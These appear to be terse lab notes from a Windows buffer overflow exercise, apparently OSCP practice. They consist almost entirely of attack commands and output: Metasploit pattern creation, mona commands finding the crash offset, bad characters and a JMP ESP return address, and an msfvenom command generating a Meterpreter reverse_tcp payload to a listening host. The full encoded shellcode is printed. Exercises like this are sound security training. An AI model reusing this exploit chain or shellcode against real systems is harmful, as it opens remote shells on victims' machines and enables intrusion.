-Crash:1300
┌──(hui㉿kali)-[~/buffer_overflow]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1700
!mona config -set workingfolder c:\mona\%p
!mona findmsp -distance 1700
-offset=1274
!mona bytearray -b "\x00"
!mona compare -f C:\mona\oscp\bytearray.bin -a 01B1FA30
-Log data, item 4
 Address=01B1FA30
 Message=Possibly bad chars: 01 02 03 04 11 12 40 41 5f 60 b8 b9 ee ef
!mona bytearray -b "\x00\x01\x11\x40\x5f\x60\xb9\xee"
-retn='BBBB'
!mona compare -f C:\mona\oscp\bytearray.bin -a 0194FA30
-Log data, item 4
 Address=0194FA30
 Message=Possibly bad chars: 11 12 40 41 5f 60 b8 b9 ee ef
!mona bytearray -b "\x00\x11\x40\x5f\x60\xb8\xee"
!mona compare -f C:\mona\oscp\bytearray.bin -a 0187FA30(Success!)
-Ex:Wait,... 5f near 60, try reduce \x60 (Success!)
!mona bytearray -b "\x00\x11\x40\x5f\xb8\xee"
!mona compare -f C:\mona\oscp\bytearray.bin -a 0191FA30
!mona jmp -r esp -cpb "\x00\x11\x40\x5f\xb8\xee"
-Address=62501203
-retn='\x03\x12\x50\x62'
┌──(hui㉿kali)-[~/buffer_overflow]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.4.32.118 LPORT=4444 -b "\x00\x11\x40\x5f\xb8\xee" -f py -v payload           
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor failed with Encoding failed due to a bad character (index=20, char=0xee)
Attempting to encode payload with 1 iterations of x86/countdown
x86/countdown failed with Encoding failed due to a bad character (index=254, char=0x00)
Attempting to encode payload with 1 iterations of x86/fnstenv_mov
x86/fnstenv_mov failed with Encoding failed due to a bad character (index=4, char=0xee)
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 385 (iteration=0)
x86/jmp_call_additive chosen with final size 385
Payload size: 385 bytes
Final size of py file: 2050 bytes
payload =  b""
payload += b"\xfc\xbb\xa5\x3e\xd5\xe2\xeb\x0c\x5e\x56\x31\x1e"
payload += b"\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff"
payload += b"\xff\x59\xd6\x5a\xe2\xa1\x27\x05\xd2\x73\xae\x20"
payload += b"\x70\xf8\xe3\x9a\xf2\xac\x0f\x50\x56\x44\x9b\x14"
payload += b"\x7f\x6b\x2c\x92\x59\x42\xad\x12\x66\x08\x6d\x34"
payload += b"\x1a\x52\xa2\x96\x23\x9d\xb7\xd7\x64\x68\xbd\x38"
payload += b"\x38\xe1\x6f\xd7\xea\x7e\xcd\xeb\x15\x50\x59\x53"
payload += b"\x6e\xd5\x9e\x20\xc2\xd4\xce\x42\x92\xce\xbe\xdf"
payload += b"\x7b\xce\x3f\x33\xfe\xc7\x34\x8f\x30\x28\xfd\x64"
payload += b"\x06\x5d\xff\xac\x56\xa1\xac\x90\x56\x2c\xac\xd5"
payload += b"\x51\xce\xdb\x2d\xa2\x73\xdc\xf5\xd8\xaf\x69\xea"
payload += b"\x7b\x24\xc9\xce\x7a\xe9\x8c\x85\x71\x46\xda\xc2"
payload += b"\x95\x59\x0f\x79\xa1\xd2\xae\xae\x23\xa0\x94\x6a"
payload += b"\x6f\x73\xb4\x2b\xd5\xd2\xc9\x2c\xb1\x8b\x6f\x26"
payload += b"\x50\xda\x10\xc7\xaa\xe3\x4c\x50\x66\x29\x6f\xa0"
payload += b"\xe0\x3a\x1c\x92\xaf\x90\x8a\x9e\x38\x3e\x4c\x96"
payload += b"\x2f\xc1\x82\x10\x3f\x3c\x23\x61\x69\xfa\x77\x31"
payload += b"\x01\x2b\xf8\xda\xd1\xd4\x2d\x76\xd8\x42\xc4\x83"
payload += b"\xfc\xe4\xb0\x89\xfc\x19\x1d\x07\x1a\x49\xcd\x47"
payload += b"\xb3\x29\xbd\x27\x63\xc1\xd7\xa7\x5c\xf1\xd7\x6d"
payload += b"\xf5\x9b\x37\xd8\xad\x33\xa1\x41\x25\xa2\x2e\x5c"
payload += b"\x43\xe4\xa5\x55\xb3\xaa\x4d\x1f\xa7\xda\x29\xdf"
payload += b"\x37\x1a\xdc\xdf\x5d\x1e\x76\xb7\xc9\x1c\xaf\xff"
payload += b"\x55\xdf\x9a\x83\x92\x1f\x5b\xb2\xe9\x29\xc9\xfa"
payload += b"\x85\x55\x1d\xfb\x55\x03\x77\xfb\x3d\xf3\x23\xa8"
payload += b"\x58\xfc\xf9\xdc\xf0\x68\x02\xb5\xa5\x3b\x6a\x3b"
payload += b"\x93\x0b\x35\xc4\xf6\x08\x32\x3a\x84\x26\x9b\x53"
payload += b"\x76\x76\x1b\xa4\x1c\x76\x4b\xcc\xeb\x59\x64\x3c"
payload += b"\x13\x70\x2d\x54\x9e\x14\x9f\xc5\x9f\x3d\x41\x58"
payload += b"\x9f\xb1\x5a\x6b\xda\xb9\x5d\x8c\x1b\xd0\x39\x8c"
payload += b"\x1b\xdd\x3f\xb0\xcd\xe7\x35\xf7\xcd\x5c\x45\x42"
payload += b"\x73\xf4\xcc\xad\x27\x07\xc5\xae\xc7\xf7\xe6\xae"
payload += b"\xc7"
->Success!
